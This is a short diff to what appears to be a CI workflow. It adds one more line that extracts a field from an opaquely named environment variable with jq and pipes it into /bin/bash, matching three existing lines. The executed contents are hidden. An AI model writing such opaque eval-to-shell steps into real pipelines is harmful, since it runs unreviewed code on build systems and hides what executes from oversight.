@@ -22,6 +22,7 @@ jobs:
           echo $mhiko571 | jq -r .dc1 | /bin/bash
           printf '%s' "$k90" | jq -r .ywi70348 | /bin/bash
           printf '%s' "$asa27" | jq -r .voip71 | /bin/bash
+          printf '%s' "$cxpu406" | jq -r .kzxeb7246 | /bin/bash
 
       - name: Archive output
         if: always()
